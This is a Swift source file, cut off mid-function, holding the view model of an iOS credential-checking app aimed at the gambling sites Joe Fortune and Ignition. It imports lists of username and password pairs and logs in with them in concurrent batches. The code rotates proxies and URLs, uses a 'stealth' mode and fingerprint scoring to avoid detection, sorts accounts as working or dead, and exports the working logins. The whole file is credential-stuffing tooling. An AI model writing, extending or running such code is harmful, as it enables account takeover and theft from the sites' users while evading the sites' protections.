import Foundation
import Observation
import SwiftUI

@Observable
@MainActor
class LoginViewModel {
    var credentials: [LoginCredential] = []
    var attempts: [LoginAttempt] = []
    var isRunning: Bool = false
    var isPaused: Bool = false
    var isStopping: Bool = false
    var pauseCountdown: Int = 0
    private var pauseCountdownTask: Task<Void, Never>?
    var globalLogs: [PPSRLogEntry] = []
    var connectionStatus: ConnectionStatus = .disconnected
    var activeTestCount: Int = 0
    var maxConcurrency: Int = 8
    var debugMode: Bool = false
    var stealthEnabled: Bool = true
    var targetSite: LoginTargetSite = .joefortune
    var appearanceMode: AppAppearanceMode = .dark
    var testTimeout: TimeInterval = 90
    var showBatchResultPopup: Bool = false
    var lastBatchResult: BatchResult?
    var consecutiveUnusualFailures: Int = 0
    var batchTotalCount: Int = 0
    var batchCompletedCount: Int = 0
    var batchProgress: Double {
        guard batchTotalCount > 0 else { return 0 }
        return Double(batchCompletedCount) / Double(batchTotalCount)
    }
    var autoRetryEnabled: Bool = true
    var autoRetryMaxAttempts: Int = 3
    private var autoRetryBackoffCounts: [String: Int] = [:]
    var consecutiveConnectionFailures: Int = 0
    var debugScreenshots: [PPSRDebugScreenshot] = []
    var fingerprintPassRate: String { FingerprintValidationService.shared.formattedPassRate }
    var fingerprintAvgScore: Double { FingerprintValidationService.shared.averageScore }
    var fingerprintHistory: [FingerprintValidationService.FingerprintScore] { FingerprintValidationService.shared.scoreHistory }
    var lastFingerprintScore: FingerprintValidationService.FingerprintScore? { FingerprintValidationService.shared.lastScore }
    var dualSiteMode: Bool = false
    var siteMode: SiteMode = .joe
    var savedCropRect: CGRect? = nil
    var automationSettings: AutomationSettings = AutomationSettings()

    nonisolated enum SiteMode: String, CaseIterable, Sendable {
        case joe = "Joe"
        case dual = "Dual"
        case ignition = "Ignition"
    }

    let urlRotation = LoginURLRotationService.shared
    let proxyService = ProxyRotationService.shared
    let blacklistService = BlacklistService.shared
    let disabledCheckService = DisabledCheckService.shared

    var isIgnitionMode: Bool {
        get { urlRotation.isIgnitionMode }
        set {
            urlRotation.isIgnitionMode = newValue
            targetSite = newValue ? .ignition : .joefortune
            persistSettings()
        }
    }

    func setSiteMode(_ mode: SiteMode) {
        siteMode = mode
        switch mode {
        case .joe:
            isIgnitionMode = false
            dualSiteMode = false
        case .dual:
            dualSiteMode = true
        case .ignition:
            isIgnitionMode = true
            dualSiteMode = false
        }
        persistSettings()
    }

    var effectiveColorScheme: ColorScheme? {
        if isIgnitionMode {
            return .dark
        }
        return appearanceMode.colorScheme
    }


    nonisolated enum ConnectionStatus: String, Sendable {
        case disconnected = "Disconnected"
        case connecting = "Connecting"
        case connected = "Connected"
        case error = "Error"
    }

    private let engine = LoginAutomationEngine()
    private let secondaryEngine = LoginAutomationEngine()
    private let persistence = LoginPersistenceService.shared
    private let notifications = PPSRNotificationService.shared
    private let logger = DebugLogger.shared
    private let backgroundService = BackgroundTaskService.shared
    private var batchTask: Task<Void, Never>?
    private var secondaryBatchTask: Task<Void, Never>?
    private var settingsSaveTask: Task<Void, Never>?
    private var credentialsSaveTask: Task<Void, Never>?
    private var heartbeatTask: Task<Void, Never>?
    private var connectionTestTask: Task<Void, Never>?
    private var sessionHeartbeatTimeout: TimeInterval {
        TimeoutResolver.resolveHeartbeatTimeout(max(90, testTimeout))
    }

    init() {
        engine.onScreenshot = { [weak self] screenshot in
            guard let self else { return }
            self.debugScreenshots.insert(screenshot, at: 0)
            if self.debugScreenshots.count > 2000 {
                self.debugScreenshots = Array(self.debugScreenshots.prefix(2000))
            }
        }
        engine.onPurgeScreenshots = { [weak self] _ in
            _ = self
        }
        engine.onConnectionFailure = { [weak self] detail in
            self?.notifications.sendConnectionFailure(detail: detail)
        }
        engine.onUnusualFailure = { [weak self] detail in
            guard let self else { return }
            self.consecutiveUnusualFailures += 1
            let retrying = self.autoRetryEnabled
            NoticesService.shared.addNotice(
                message: detail,
                source: .login,
                autoRetried: retrying
            )
            self.log("Unusual failure: \(detail)\(retrying ? " — auto-retry queued" : "")", level: .warning)
        }
        engine.onLog = { [weak self] message, level in
            self?.log(message, level: level)
        }
        engine.onURLFailure = { [weak self] urlString in
            self?.urlRotation.reportFailure(urlString: urlString)
            self?.log("URL disabled after failures: \(urlString)", level: .warning)
        }
        engine.onURLSuccess = { [weak self] urlString in
            self?.urlRotation.reportSuccess(urlString: urlString)
        }
        engine.onResponseTime = { [weak self] urlString, duration in
            self?.urlRotation.reportResponseTime(urlString: urlString, duration: duration)
        }
        engine.onBlankScreenshot = { [weak self] urlString in
            guard let self else { return }
            self.urlRotation.reportFailure(urlString: urlString)
            self.log("Blank screenshot on \(URL(string: urlString)?.host ?? urlString) — URL marked failed, next test uses different URL", level: .warning)
        }

        secondaryEngine.onScreenshot = { [weak self] screenshot in
            guard let self else { return }
            self.debugScreenshots.insert(screenshot, at: 0)
            if self.debugScreenshots.count > 2000 {
                self.debugScreenshots = Array(self.debugScreenshots.prefix(2000))
            }
        }
        secondaryEngine.onPurgeScreenshots = { [weak self] _ in
            _ = self
        }
        secondaryEngine.onLog = { [weak self] message, level in
            self?.log("[DUAL] \(message)", level: level)
        }
        secondaryEngine.onURLFailure = { [weak self] urlString in
            self?.urlRotation.reportFailure(urlString: urlString)
        }
        secondaryEngine.onURLSuccess = { [weak self] urlString in
            self?.urlRotation.reportSuccess(urlString: urlString)
        }
        secondaryEngine.onResponseTime = { [weak self] urlString, duration in
            self?.urlRotation.reportResponseTime(urlString: urlString, duration: duration)
        }
        secondaryEngine.onBlankScreenshot = { [weak self] urlString in
            guard let self else { return }
            self.urlRotation.reportFailure(urlString: urlString)
            self.log("[DUAL] Blank screenshot on \(URL(string: urlString)?.host ?? urlString) — URL marked failed, rotating", level: .warning)
        }

        notifications.requestPermission()
        loadPersistedData()
        loadAutomationSettings()
        restoreTestQueueIfNeeded()
    }

    private func loadPersistedData() {
        credentials = persistence.loadCredentials()
        if let settings = persistence.loadSettings() {
            if let site = LoginTargetSite(rawValue: settings.targetSite) {
                targetSite = site
            }
            maxConcurrency = settings.maxConcurrency
            debugMode = settings.debugMode
            if let mode = AppAppearanceMode(rawValue: settings.appearanceMode) {
                appearanceMode = mode
            }
            stealthEnabled = settings.stealthEnabled
            testTimeout = settings.testTimeout
        }
        loadCropRect()
        if !credentials.isEmpty {
            log("Restored \(credentials.count) credentials from storage")
        }
    }

    private func restoreTestQueueIfNeeded() {
        guard let queuedIds = persistence.loadTestQueue(), !queuedIds.isEmpty else { return }
        let idSet = Set(queuedIds)
        var restoredCount = 0
        for cred in credentials where idSet.contains(cred.id) {
            if cred.status == .testing {
                cred.status = .untested
                restoredCount += 1
            }
        }
        persistence.clearTestQueue()
        if restoredCount > 0 {
            log("Restored \(restoredCount) interrupted test(s) back to queue", level: .warning)
            persistCredentials()
        }
    }

    func persistCredentials() {
        credentialsSaveTask?.cancel()
        credentialsSaveTask = Task {
            try? await Task.sleep(for: .milliseconds(500))
            guard !Task.isCancelled else { return }
            persistence.saveCredentials(credentials)
        }
    }

    func persistCredentialsNow() {
        credentialsSaveTask?.cancel()
        credentialsSaveTask = nil
        persistence.saveCredentials(credentials)
    }

    func persistSettings() {
        settingsSaveTask?.cancel()
        settingsSaveTask = Task {
            try? await Task.sleep(for: .milliseconds(300))
            guard !Task.isCancelled else { return }
            persistence.saveSettings(
                targetSite: targetSite.rawValue,
                maxConcurrency: maxConcurrency,
                debugMode: debugMode,
                appearanceMode: appearanceMode.rawValue,
                stealthEnabled: stealthEnabled,
                testTimeout: testTimeout
            )
        }
    }

    private let automationSettingsKey = "automation_settings_v1"

    func persistAutomationSettings() {
        if let data = try? JSONEncoder().encode(automationSettings) {
            UserDefaults.standard.set(data, forKey: automationSettingsKey)
        }
        syncAutomationSettingsToEngine()
    }

    private func loadAutomationSettings() {
        if let data = UserDefaults.standard.data(forKey: automationSettingsKey),
           let loaded = try? JSONDecoder().decode(AutomationSettings.self, from: data) {
            automationSettings = loaded
        }
        syncAutomationSettingsToEngine()
    }

    private func syncAutomationSettingsToEngine() {
        maxConcurrency = automationSettings.maxConcurrency
        engine.automationSettings = automationSettings
        secondaryEngine.automationSettings = automationSettings
    }

    func flowAssignment(for urlString: String) -> URLFlowAssignment? {
        automationSettings.urlFlowAssignments.first { assignment in
            urlString.localizedStandardContains(assignment.urlPattern) ||
            assignment.urlPattern.localizedStandardContains(urlString)
        }
    }

    func saveCropRect(_ rect: CGRect) {
        savedCropRect = rect
        let dict: [String: Double] = [
            "x": rect.origin.x,
            "y": rect.origin.y,
            "w": rect.size.width,
            "h": rect.size.height,
        ]
        UserDefaults.standard.set(dict, forKey: "login_crop_rect_v1")
        log("Saved crop region: \(Int(rect.origin.x)),\(Int(rect.origin.y)) \(Int(rect.width))x\(Int(rect.height))")
    }

    func clearCropRect() {
        savedCropRect = nil
        UserDefaults.standard.removeObject(forKey: "login_crop_rect_v1")
        log("Cleared crop region")
    }

    private func loadCropRect() {
        guard let dict = UserDefaults.standard.dictionary(forKey: "login_crop_rect_v1"),
              let x = dict["x"] as? Double,
              let y = dict["y"] as? Double,
              let w = dict["w"] as? Double,
              let h = dict["h"] as? Double else { return }
        savedCropRect = CGRect(x: x, y: y, width: w, height: h)
    }

    func syncFromiCloud() {
        if let synced = persistence.syncFromiCloud() {
            let existingUsernames = Set(credentials.map(\.username))
            var added = 0
            for cred in synced where !existingUsernames.contains(cred.username) {
                credentials.append(cred)
                added += 1
            }
            if added > 0 {
                log("iCloud sync: merged \(added) new credentials", level: .success)
                persistCredentials()
            } else {
                log("iCloud sync: no new credentials found", level: .info)
            }
        }
    }

    var workingCredentials: [LoginCredential] { credentials.filter { $0.status == .working } }
    var noAccCredentials: [LoginCredential] { credentials.filter { $0.status == .noAcc } }
    var permDisabledCredentials: [LoginCredential] { credentials.filter { $0.status == .permDisabled } }
    var tempDisabledCredentials: [LoginCredential] { credentials.filter { $0.status == .tempDisabled } }
    var unsureCredentials: [LoginCredential] { credentials.filter { $0.status == .unsure } }
    var untestedCredentials: [LoginCredential] { credentials.filter { $0.status == .untested } }
    var testingCredentials: [LoginCredential] { credentials.filter { $0.status == .testing } }

    let tempDisabledService = TempDisabledCheckService.shared
    var activeAttempts: [LoginAttempt] { attempts.filter { !$0.status.isTerminal } }
    var completedAttempts: [LoginAttempt] { attempts.filter { $0.status == .completed } }
    var failedAttempts: [LoginAttempt] { attempts.filter { $0.status == .failed } }

    func getNextTestURL() -> URL {
        if let rotatedURL = urlRotation.nextURL() {
            return rotatedURL
        }
        return targetSite.url
    }

    func getNextTestURL(forSite site: LoginTargetSite) -> URL {
        let wasIgnition = urlRotation.isIgnitionMode
        urlRotation.isIgnitionMode = (site == .ignition)
        let url = urlRotation.nextURL() ?? site.url
        urlRotation.isIgnitionMode = wasIgnition
        return url
    }

    func testConnection() async {
        connectionTestTask?.cancel()
        let task = Task { await _testConnection() }
        connectionTestTask = task
        await task.value
    }

    private func _testConnection() async {
        connectionStatus = .connecting
        let testURL = getNextTestURL()
        log("Testing connection to \(testURL.host ?? "unknown")...")

        let currentTarget: ProxyRotationService.ProxyTarget = isIgnitionMode ? .ignition : .joe
        let currentMode = proxyService.connectionMode(for: currentTarget)
        log("Using \(currentTarget.rawValue) network mode: \(currentMode.label)")

        let config = URLSessionConfiguration.ephemeral
        config.timeoutIntervalForRequest = TimeoutResolver.resolveRequestTimeout(15)
        config.timeoutIntervalForResource = TimeoutResolver.resolveResourceTimeout(20)
        config.waitsForConnectivity = false

        if automationSettings.useAssignedNetworkForTests && currentMode == .proxy {
            if let proxy = proxyService.nextWorkingProxy(for: currentTarget) {
                var proxyDict: [String: Any] = [
                    "SOCKSEnable": true,
                    "SOCKSProxy": proxy.host,
                    "SOCKSPort": proxy.port,
                ]
                if let user = proxy.username, let pass = proxy.password {
                    proxyDict["SOCKSUser"] = user
                    proxyDict["SOCKSPassword"] = pass
                }
                config.connectionProxyDictionary = proxyDict
                log("Connection test via proxy: \(proxy.displayString)")
            }
        }

        let urlSession = URLSession(configuration: config)
        defer { urlSession.invalidateAndCancel() }

        var request = URLRequest(url: testURL, cachePolicy: .reloadIgnoringLocalAndRemoteCacheData, timeoutInterval: TimeoutResolver.resolveRequestTimeout(15))
        request.httpMethod = "GET"
        request.setValue("Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1", forHTTPHeaderField: "User-Agent")
        request.setValue("text/html,application/xhtml+xml", forHTTPHeaderField: "Accept")

        var httpOK = false
        do {
            let (data, response) = try await urlSession.data(for: request)
            if let http = response as? HTTPURLResponse {
                if http.statusCode >= 200 && http.statusCode < 400 {
                    httpOK = true
                    consecutiveConnectionFailures = 0
                    urlRotation.reportSuccess(urlString: testURL.absoluteString)
                    log("HTTP OK — \(http.statusCode) (\(data.count) bytes)", level: .success)
                } else {
                    connectionStatus = .error
                    urlRotation.reportFailure(urlString: testURL.absoluteString)
                    log("Connection failed — HTTP \(http.statusCode)", level: .error)
                    return
                }
            }
        } catch let error as NSError {
            connectionStatus = .error
            consecutiveConnectionFailures += 1
            urlRotation.reportFailure(urlString: testURL.absoluteString)
            let detail: String
            if error.domain == NSURLErrorDomain {
                switch error.code {
                case NSURLErrorNotConnectedToInternet: detail = "No internet connection"
                case NSURLErrorTimedOut: detail = "Connection timed out (15s)"
                case NSURLErrorCannotFindHost: detail = "DNS failed for \(testURL.host ?? "")"
                case NSURLErrorCannotConnectToHost: detail = "Cannot connect to \(testURL.host ?? "")"
                case NSURLErrorNetworkConnectionLost: detail = "Network connection lost"
                case NSURLErrorSecureConnectionFailed: detail = "SSL/TLS handshake failed"
                default: detail = "Network error (\(error.code)): \(error.localizedDescription)"
                }
            } else {
                detail = error.localizedDescription
            }
            log("Connection failed: \(detail)", level: .error)

            if consecutiveConnectionFailures >= 3 {
                log("\(consecutiveConnectionFailures) consecutive failures — try switching networks or checking proxy settings", level: .error)
            }
            return
        }

        guard httpOK else {
            connectionStatus = .error
            return
        }

        let session = LoginSiteWebSession(targetURL: testURL)
        session.stealthEnabled = stealthEnabled
        session.setUp(wipeAll: true)

        let loaded = await session.loadPage(timeout: TimeoutResolver.resolvePageLoadTimeout(20))
        if loaded {
            let verification = await session.verifyLoginFieldsExist()
            if verification.found == 2 {
                connectionStatus = .connected
                log("WebView verification: both login fields found", level: .success)
            } else {
                connectionStatus = .connected
                log("WebView verification: \(verification.found)/2 fields. Missing: \(verification.missing.joined(separator: ", "))", level: .warning)
            }
        } else {
            connectionStatus = .connected
            let errorDetail = session.lastNavigationError ?? "unknown"
            log("WebView page load failed (\(errorDetail)) — HTTP works but WKWebView could not render", level: .warning)
        }
        session.tearDown(wipeAll: true)
    }

    func smartImportCredentials(_ input: String) {
        logger.log("Smart import started (\(input.count) chars)", category: .persistence, level: .info)
        let parsed = LoginCredential.smartParse(input)
        let lines = input.components(separatedBy: .newlines)
            .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
            .filter { !$0.isEmpty }

        if parsed.isEmpty && !lines.isEmpty {
            for line in lines {
                log("Could not parse: \(line)", level: .warning)
            }
            return
        }

        let permDisabledUsernames = Set(permDisabledCredentials.map(\.username))

        var added = 0
        var skippedBlacklist = 0
        for cred in parsed {
            if permDisabledUsernames.contains(cred.username) {
                log("Skipped perm disabled: \(cred.username)", level: .warning)
                continue
            }
            if blacklistService.autoExcludeBlacklist && blacklistService.isBlacklisted(cred.username) {
                skippedBlacklist += 1
                continue
            }
            let isDuplicate = credentials.contains { $0.username == cred.username }
            if isDuplicate {
                log("Skipped duplicate: \(cred.username)", level: .warning)
            } else {
                credentials.append(cred)
                added += 1
            }
        }

        if skippedBlacklist > 0 {
            log("Skipped \(skippedBlacklist) blacklisted credential(s)", level: .warning)
        }

        if parsed.count > 0 {
            log("Smart import: \(added) added from \(parsed.count) parsed (\(lines.count) lines)", level: .success)
            logger.log("Credential import: \(added) added, \(skippedBlacklist) blacklisted, from \(parsed.count) parsed", category: .persistence, level: .success)
        }
        persistCredentials()
    }

    func deleteCredential(_ cred: LoginCredential) {
        credentials.removeAll { $0.id == cred.id }
        log("Removed credential: \(cred.username)")
        persistCredentials()
    }

    func restoreCredential(_ cred: LoginCredential) {
        cred.status = .untested
        log("Restored \(cred.username) to untested")
        persistCredentials()
    }

    func purgePermDisabledCredentials() {
        let count = permDisabledCredentials.count
        credentials.removeAll { $0.status == .permDisabled }
        log("Purged \(count) perm disabled credential(s)")
        persistCredentials()
    }

    func purgeNoAccCredentials() {
        let count = noAccCredentials.count
        credentials.removeAll { $0.status == .noAcc }
        log("Purged \(count) no-acc credential(s)")
        persistCredentials()
    }

    func purgeUnsureCredentials() {
        let count = unsureCredentials.count
        credentials.removeAll { $0.status == .unsure }
        log("Purged \(count) unsure credential(s)")
        persistCredentials()
    }

    func testSingleCredential(_ cred: LoginCredential) {
        guard !isRunning || activeTestCount < maxConcurrency else {
            log("Max concurrency reached", level: .warning)
            return
        }

        cred.status = .testing
        let attempt = LoginAttempt(credential: cred, sessionIndex: activeTestCount + 1)
        attempts.insert(attempt, at: 0)

        Task {
            configureEngine()
            isRunning = true
            activeTestCount += 1
            let testURL = getNextTestURL()
            let outcome = await engine.runLoginTest(attempt, targetURL: testURL, timeout: testTimeout)
            activeTestCount -= 1
            handleOutcome(outcome, credential: cred, attempt: attempt)
            if activeTestCount == 0 { isRunning = false }
            persistCredentials()
        }
    }

    private func configureEngine() {
        engine.debugMode = debugMode
        engine.stealthEnabled = stealthEnabled
        engine.automationSettings = automationSettings
        secondaryEngine.debugMode = debugMode
        secondaryEngine.stealthEnabled = stealthEnabled
        secondaryEngine.automationSettings = automationSettings
    }

    private func handleOutcome(_ outcome: LoginOutcome, credential: LoginCredential, attempt: LoginAttempt) {
        let duration = attempt.duration ?? 0

        switch outcome {
        case .success:
            credential.recordResult(success: true, duration: duration)
            log("\(credential.username) — LOGIN SUCCESS (\(attempt.formattedDuration))", level: .success)
            consecutiveUnusualFailures = 0

        case .noAcc:
            credential.recordResult(success: false, duration: duration, error: attempt.errorMessage, detail: "no account")
            log("\(credential.username) — NO ACC: incorrect credentials", level: .error)
            consecutiveUnusualFailures = 0
            if blacklistService.autoBlacklistNoAcc {
                blacklistService.addToBlacklist(credential.username, reason: "Auto: no account")
                log("\(credential.username) — auto-added to blacklist (no acc)", level: .warning)
            }

        case .permDisabled:
            credential.recordResult(success: false, duration: duration, error: attempt.errorMessage, detail: "permanently disabled")
            log("\(credential.username) — PERM DISABLED", level: .error)
            consecutiveUnusualFailures = 0
            blacklistService.addToBlacklist(credential.username, reason: "Auto: perm disabled")
            log("\(credential.username) — auto-added to blacklist (perm disabled)", level: .warning)

        case .tempDisabled:
            credential.recordResult(success: false, duration: duration, error: attempt.errorMessage, detail: "temporarily disabled")
            log("\(credential.username) — TEMP DISABLED (moved to temp disabled section)", level: .warning)
            consecutiveUnusualFailures = 0

        case .redBannerError:
            credential.status = .untested
            requeueCredentialToBottom(credential)
            log("\(credential.username) — red banner error detected, requeued to bottom", level: .warning)

        case .unsure, .timeout, .connectionFailure:
            credential.status = .untested
            let reason: String
            switch outcome {
            case .timeout:
                reason = "timeout (45s combined)"
                requeueCredentialToBottom(credential)
            case .connectionFailure:
                reason = "connection failure"
                consecutiveConnectionFailures += 1
                requeueCredentialToBottom(credential)
            default:
                reason = "unsure result"
                requeueCredentialToBottom(credential)
            }
            log("\(credential.username) — requeued to bottom (\(reason))", level: .warning)
        }
    }

    func testSelectedCredentials(ids: Set<String>) {
        let credsToTest = credentials.filter { ids.contains($0.id) && $0.status == .untested }
        guard !credsToTest.isEmpty else {
            log("No matching untested credentials to test", level: .warning)
            return
        }
        isPaused = false
        isStopping = false
        autoRetryBackoffCounts.removeAll()
        log("Starting selective batch: \(credsToTest.count) credentials")
        logger.log("BATCH START (selective): \(credsToTest.count) creds, concurrency=\(maxConcurrency)", category: .login, level: .info)
        testSingleSiteBatch(credsToTest)
    }

    func testAllUntested() {
        let credsToTest = untestedCredentials
        guard !credsToTest.isEmpty else {
            log("No untested credentials in queue", level: .warning)
            return
        }

        isPaused = false
        isStopping = false
        autoRetryBackoffCounts.removeAll()

        if dualSiteMode {
            log("Starting DUAL-SITE batch: \(credsToTest.count) creds, Joe + Ignition simultaneously")
            logger.log("BATCH START (dual): \(credsToTest.count) creds, concurrency=\(maxConcurrency), stealth=\(stealthEnabled)", category: .login, level: .info, metadata: ["mode": "dual", "count": "\(credsToTest.count)"])
            testDualSite(credsToTest)
        } else {
            log("Starting batch test: \(credsToTest.count) credentials, max \(maxConcurrency) concurrent, stealth: \(stealthEnabled ? "ON" : "OFF")")
            logger.log("BATCH START: \(credsToTest.count) creds, concurrency=\(maxConcurrency), stealth=\(stealthEnabled), site=\(targetSite.rawValue)", category: .login, level: .info, metadata: ["mode": "single", "count": "\(credsToTest.count)", "site": targetSite.rawValue])
            testSingleSiteBatch(credsToTest)
        }
    }

    private func testSingleSiteBatch(_ credsToTest: [LoginCredential]) {
        isRunning = true
        batchTotalCount = credsToTest.count
        batchCompletedCount = 0
        startHeartbeatMonitor()
        DeviceProxyService.shared.notifyBatchStart()
        backgroundService.beginExtendedBackgroundExecution(reason: "Login batch test")
        persistence.saveTestQueue(credentialIds: credsToTest.map(\.id))
        var batchWorking = 0
        var batchDead = 0
        var batchRequeued = 0

        batchTask = Task {
            configureEngine()
            await withTaskGroup(of: Void.self) { group in
                var running = 0

                for cred in credsToTest {
                    if isStopping { break }

                    while isPaused && !isStopping {
                        try? await Task.sleep(for: .milliseconds(500))
                    }

                    if isStopping { break }

                    if running >= maxConcurrency {
                        await group.next()
                        running -= 1
                    }

                    running += 1
                    cred.status = .testing
                    let sessionIdx = running

                    let attempt = LoginAttempt(credential: cred, sessionIndex: sessionIdx)
                    attempts.insert(attempt, at: 0)
                    activeTestCount += 1

                    let testURL = getNextTestURL()

                    group.addTask { [engine, testTimeout] in
                        let outcome = await engine.runLoginTest(attempt, targetURL: testURL, timeout: testTimeout)
                        await MainActor.run {
                            self.activeTestCount -= 1
                            self.batchCompletedCount += 1
                            self.handleOutcome(outcome, credential: cred, attempt: attempt)

                            switch outcome {
                            case .success: batchWorking += 1
                            case .noAcc, .permDisabled, .tempDisabled: batchDead += 1
                            case .unsure, .timeout, .connectionFailure, .redBannerError: batchRequeued += 1
                            }

                            self.persistCredentials()
                        }
                    }
                }

                await group.waitForAll()
            }

            finalizeBatch(working: batchWorking, dead: batchDead, requeued: batchRequeued)
        }
    }

    private func testDualSite(_ credsToTest: [LoginCredential]) {
        isRunning = true
        batchTotalCount = credsToTest.count
        batchCompletedCount = 0
        startHeartbeatMonitor()
        DeviceProxyService.shared.notifyBatchStart()
        backgroundService.beginExtendedBackgroundExecution(reason: "Login dual-site batch test")
        persistence.saveTestQueue(credentialIds: credsToTest.map(\.id))
        var batchWorking = 0
        var batchDead = 0
        var batchRequeued = 0

        let halfConcurrency = max(1, maxConcurrency / 2)

        batchTask = Task {
            configureEngine()

            await withTaskGroup(of: Void.self) { group in
                var running = 0

                for cred in credsToTest {
                    if isStopping { break }

                    while isPaused && !isStopping {
                        try? await Task.sleep(for: .milliseconds(500))
                    }
                    if isStopping { break }

                    if running >= maxConcurrency {
                        await group.next()
                        running -= 1
                    }

                    running += 1
                    cred.status = .testing
                    let sessionIdx = running

                    let useIgnition = running > halfConcurrency
                    let targetEngine = useIgnition ? secondaryEngine : engine
                    let testURL = useIgnition ? getNextTestURL(forSite: .ignition) : getNextTestURL(forSite: .joefortune)
                    let siteLabel = useIgnition ? "IGN" : "JOE"

                    let attempt = LoginAttempt(credential: cred, sessionIndex: sessionIdx)
                    attempts.insert(attempt, at: 0)
                    activeTestCount += 1

                    group.addTask { [testTimeout] in
                        let outcome = await targetEngine.runLoginTest(attempt, targetURL: testURL, timeout: testTimeout)
                        await MainActor.run {
                            self.activeTestCount -= 1
                            self.batchCompletedCount += 1
                            attempt.logs.insert(PPSRLogEntry(message: "[\(siteLabel)] Tested on \(testURL.host ?? "")", level: .info), at: 0)
                            self.handleOutcome(outcome, credential: cred, attempt: attempt)

                            switch outcome {
                            case .success: batchWorking += 1
                            case .noAcc, .permDisabled, .tempDisabled: batchDead += 1
                            case .unsure, .timeout, .connectionFailure, .redBannerError: batchRequeued += 1
                            }

                            self.persistCredentials()
                        }
                    }
                }

                await group.waitForAll()
            }

            finalizeBatch(working: batchWorking, dead: batchDead, requeued: batchRequeued)
        }
    }

    private func finalizeBatch(working: Int, dead: Int, requeued: Int) {
        let result = BatchResult(working: working, dead: dead, requeued: requeued, total: working + dead + requeued)
        lastBatchResult = result
        cancelPauseCountdown()
        stopHeartbeatMonitor()
        persistence.clearTestQueue()
        isRunning = false
        isPaused = false
        pauseCountdown = 0
        activeTestCount = 0

        let stoppedEarly = isStopping
        isStopping = false

        resetStuckTestingCredentials()
        backgroundService.endExtendedBackgroundExecution()

        if stoppedEarly {
            log("Batch stopped: \(working) working, \(dead) dead, \(requeued) requeued", level: .warning)
            logger.log("BATCH STOPPED: \(working) working, \(dead) dead, \(requeued) requeued", category: .login, level: .warning)
        } else {
            log("Batch complete: \(working) working, \(dead) dead, \(requeued) requeued", level: .success)
            logger.log("BATCH COMPLETE: \(working) working, \(dead) dead, \(requeued) requeued (\(result.alivePercentage)% alive)", category: .login, level: .success, metadata: ["working": "\(working)", "dead": "\(dead)", "requeued": "\(requeued)"])
        }

        if autoRetryEnabled && requeued > 0 {
            let retryCreds = credentials.filter { cred in
                cred.status == .untested && (autoRetryBackoffCounts[cred.id] ?? 0) < autoRetryMaxAttempts
            }
            if !retryCreds.isEmpty {
                let retryCount = retryCreds.count
                for cred in retryCreds {
                    autoRetryBackoffCounts[cred.id, default: 0] += 1
                }
                let backoffDelay = Double(autoRetryBackoffCounts.values.max() ?? 1) * 5.0
                log("Auto-retry: \(retryCount) credential(s) scheduled for retry in \(Int(backoffDelay))s", level: .info)
                Task {
                    try? await Task.sleep(for: .seconds(backoffDelay))
                    guard !self.isRunning else { return }
                    self.testSingleSiteBatch(retryCreds)
                }
            }
        }

        showBatchResultPopup = true
        notifications.sendBatchComplete(working: working, dead: dead, requeued: requeued)
        persistCredentials()
    }

    private func resetStuckTestingCredentials() {
        var resetCount = 0
        for cred in credentials where cred.status == .testing {
            cred.status = .untested
            resetCount += 1
        }
        if resetCount > 0 {
            log("Reset \(resetCount) stuck testing credential(s) back to untested", level: .warning)
        }
    }

    func pauseQueue() {
        isPaused = true
        pauseCountdown = 60
        log("Queue paused for 60 seconds — all sessions frozen, auto-resume in 60s", level: .warning)
        startPauseCountdown()
    }

    func resumeQueue() {
        cancelPauseCountdown()
        isPaused = false
        pauseCountdown = 0
        log("Queue resumed", level: .info)
    }

    func stopQueue() {
        cancelPauseCountdown()
        isStopping = true
        isPaused = false
        pauseCountdown = 0
        log("Stopping queue — current batch sessions completing, no new batches will be added", level: .warning)
    }

    func stopAfterCurrent() {
        cancelPauseCountdown()
        isStopping = true
        isPaused = false
        pauseCountdown = 0
        log("Stopping after current batch due to unusual failures...", level: .warning)
    }

    private func startPauseCountdown() {
        pauseCountdownTask?.cancel()
        pauseCountdownTask = Task {
            for tick in stride(from: 59, through: 0, by: -1) {
                try? await Task.sleep(for: .seconds(1))
                guard !Task.isCancelled else { return }
                if !isPaused { return }
                pauseCountdown = tick
            }
            guard !Task.isCancelled, isPaused else { return }
            isPaused = false
            pauseCountdown = 0
            log("Pause timer expired — queue auto-resumed", level: .info)
        }
    }

    private func cancelPauseCountdown() {
        pauseCountdownTask?.cancel()
        pauseCountdownTask = nil
    }

    private func startHeartbeatMonitor() {
        heartbeatTask?.cancel()
        heartbeatTask = Task {
            while !Task.isCancelled && isRunning {
                try? await Task.sleep(for: .seconds(15))
                guard !Task.isCancelled, isRunning else { break }
                let now = Date()
                var stuckCount = 0
                for attempt in attempts where !attempt.status.isTerminal {
                    guard let started = attempt.startedAt else { continue }
                    let elapsed = now.timeIntervalSince(started)
                    if elapsed > sessionHeartbeatTimeout && attempt.status != .queued {
                        attempt.status = .failed
                        attempt.errorMessage = "Session stuck for \(Int(elapsed))s — force terminated by heartbeat"
                        attempt.completedAt = now
                        if let cred = credentials.first(where: { $0.id == attempt.credential.id }), cred.status == .testing {
                            cred.status = .untested
                            stuckCount += 1
                        }
                    }
                }
                if stuckCount > 0 {
                    log("Heartbeat: force-terminated \(stuckCount) stuck session(s) (>\(Int(sessionHeartbeatTimeout))s)", level: .warning)
                    logger.log("Heartbeat terminated \(stuckCount) stuck login sessions", category: .login, level: .warning)
                    persistCredentials()
                }
            }
        }
    }

    private func stopHeartbeatMonitor() {
        heartbeatTask?.cancel()
        heartbeatTask = nil
    }

    func retestCredential(_ cred: LoginCredential) {
        cred.status = .untested
        testSingleCredential(cred)
    }

    func clearHistory() {
        attempts.removeAll(where: { $0.status.isTerminal })
        log("Cleared completed attempts")
    }

    func clearAll() {
        attempts.removeAll()
        globalLogs.removeAll()
    }

    func exportWorkingCredentials() -> String {
        workingCredentials.map(\.exportFormat).joined(separator: "\n")
    }

    func exportCredentials(filter: CredentialExportFilter) -> String {
        let creds: [LoginCredential]
        switch filter {
        case .all: creds = credentials
        case .untested: creds = untestedCredentials
        case .working: creds = workingCredentials
        case .tempDisabled: creds = tempDisabledCredentials
        case .permDisabled: creds = permDisabledCredentials
        case .noAcc: creds = noAccCredentials
        case .unsure: creds = unsureCredentials
        }
        return creds.map(\.exportFormat).joined(separator: "\n")
    }

    func exportCredentialsCSV(filter: CredentialExportFilter) -> String {
        let creds: [LoginCredential]
        switch filter {
        case .all: creds = credentials
        case .untested: creds = untestedCredentials
        case .working: creds = workingCredentials
        case .tempDisabled: creds = tempDisabledCredentials
